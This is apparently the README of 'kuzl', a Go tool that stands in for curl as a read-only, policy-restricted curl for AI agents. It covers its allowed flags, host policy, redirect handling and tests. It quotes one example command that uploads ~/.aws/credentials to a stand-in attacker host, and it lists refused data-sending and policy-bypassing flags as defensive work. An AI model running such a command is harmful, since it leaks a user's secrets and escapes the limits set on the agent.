# kuzl

A read-only `curl` for AI agents: GET and HEAD only, nothing local is ever
sent, and where requests may go is set by a policy built into the binary,
not by the command line or the environment.

kuzl is to `curl` what [ghzt](https://github.com/evadcmd/ghzt) is to `gh`
and `git`: one binary, symlinked as `curl`, that an agent can be allowed to
run with a plain `Bash(curl:*)` prefix rule. The real curl can't be: once it
is allowed, `curl -d @~/.aws/credentials https://evil.example` reads a file
and sends it out in one call.

The design and roadmap live in
[#1](https://github.com/evadcmd/kuzl/issues/1). Steps 1 to 4 are in: the
skeleton, the network policy (`internal/netguard`), `curl` for GET and HEAD,
and files and ranges (`-o`, `-O`, `-r`, `-w`).

## curl

```sh
curl [flags] <url>
```

The flags are curl's: `-s`, `-S`, `-f`, `--fail-with-body`, `-L`,
`--max-redirs`, `-I`, `-i`, `-X GET|HEAD`, `-H`, `-A`, `-e`, `-m`,
`--connect-timeout`, `--compressed`, `-o`, `-O`, `--create-dirs`,
`--max-filesize`, `-r` and `-w`. Errors are curl's `curl: (N) message` with
curl's exit code: 3 for a malformed URL, 6 when the host doesn't resolve, 7
when it can't be reached, 22 for `-f` on a status of 400 or more, 23 when the
output can't be written, 28 on a timeout, 47 past `--max-redirs` and 63 past
`--max-filesize`.

Where kuzl differs:

- Anything kuzl doesn't do exits 2 with the reason on one line, before
  anything is sent, even under `-s`: flags that send data (`-d`, `--json`,
  `-F`, `-T`), read or write local files (`-K`, `-b`, `-c`, `--netrc`, `-H
  @file`) or go around the policy (`-x`, `-k`, `--unix-socket`, `--resolve`,
  `--connect-to`, `--location-trusted`), `-u`, a `Host` header, a method
  other than GET or HEAD, and a request the policy refuses.
- Stdout gets at most 100000 bytes, headers included, cut on a character
  boundary, with a note on stderr of how much was left out. A body that isn't
  UTF-8 text is not written to stdout and exits 23. The note points at `-o`.
- `-o` and `-O` write only inside `KUZL_ROOT`, or the working directory if it
  is unset. A path outside it is refused (exit 2) before the request is sent,
  and a symlink as the file itself fails with exit 23. Missing directories are
  always created, so `--create-dirs` changes nothing. `-O` takes the name from
  the URL's last path segment as written, not decoded, and not from where
  `-L` ends up.
- A download is at most 100 MiB; `--max-filesize` can lower that, not raise
  it. Past it, curl's exit 63: with `-o` the part written so far stays, on
  stdout nothing is written.
- `-w` knows `%{http_code}`, `%{content_type}`, `%{url_effective}` and
  `%{size_download}`; any other variable is a usage error, and `-w @file` is
  refused. It is written after HTTP and transfer errors, as curl does, but
  not after a refusal.
- One URL per call. `-i` and `-I` print the headers sorted, in Go's
  canonical case, not in the server's order.
- The default `User-Agent` is `kuzl/<version>`; `-A` sets another.

## Testing locally

```sh
make build   # builds policy.yaml in; POLICY=other.yaml for another, POLICY= for none
bin/kuzl policy
bin/kuzl curl --help
```

`bin/` is gitignored. Run as `kuzl`, the binary has `curl` as a subcommand,
so no symlink is needed for testing. Don't put `bin/` on your `PATH` once it
has a `curl` symlink: it would shadow the real one.

### Network policy

The policy is a YAML file built into the binary, so an agent running kuzl
can't change it. [`policy.yaml`](policy.yaml) is the one `make build` uses,
with the reason for each entry; `make build POLICY=...` builds another file
in instead. The keys:

- `allow_hosts`: the only hosts allowed. `example.com` matches that host
  only, `"*.example.com"` its subdomains (not `example.com` itself), and
  `"*"` every public host. Quote entries starting with `*`: unquoted, YAML
  reads them as an alias.
- `deny_hosts`: hosts refused, even if `allow_hosts` matches them.
- `deny_addrs`: IPs and CIDR prefixes never dialed, checked on the address a
  name resolves to.

Every key may be left out. A host not in `allow_hosts` is refused, so with
`allow_hosts` left out, empty or null, and with no policy built in
(`POLICY=`), every host is. An unknown key, a value of the wrong type or an
invalid entry is an error, reported with its line, rather than skipped.
`make build` runs `bin/kuzl policy`, which prints the policy as kuzl reads
it, and fails the build if it doesn't validate.

Whatever the policy says, only http and https URLs without credentials are
fetched, and only public addresses are dialed: loopback, private, link-local
(the cloud metadata endpoint included), CGNAT and the other special-purpose
ranges are refused, on the address actually connected to. `HTTP(S)_PROXY` is
ignored.

### Redirects and credentials

Every redirect hop goes through the same checks as the first request.
`Authorization`, `Cookie` and `Proxy-Authorization` headers are sent only to
the first request's origin (scheme, host and port), as curl does without
`--location-trusted`, which kuzl doesn't have. A redirect to a subdomain
doesn't get them either, though Go's client alone would send them there.

Back on the first origin, later in the chain, they are sent again after a hop
to a subdomain, as curl does, but not after a hop to another domain: there
Go's client drops them for the rest of the chain (CVE-2024-45336). Either way,
they never reach another origin. See
[#8](https://github.com/evadcmd/kuzl/issues/8).

### Environment

- `KUZL_ROOT`: the directory `-o` (step 4) writes are confined to. Defaults
  to the working directory.
- Telemetry stays off unless an OTLP endpoint is set
  (`OTEL_EXPORTER_OTLP_ENDPOINT` or `OTEL_EXPORTER_OTLP_LOGS_ENDPOINT`).

### Unit tests

```sh
go vet ./...
go test -race ./...
golangci-lint run
```

`go test` stays offline. The check of the non-public ranges against IANA's
special-purpose registries downloads them, so it runs only when asked, as the
monthly [IANA workflow](.github/workflows/iana.yml) does:

```sh
KUZL_IANA_CHECK=1 go test -run '^TestIANA$' ./internal/netguard
```
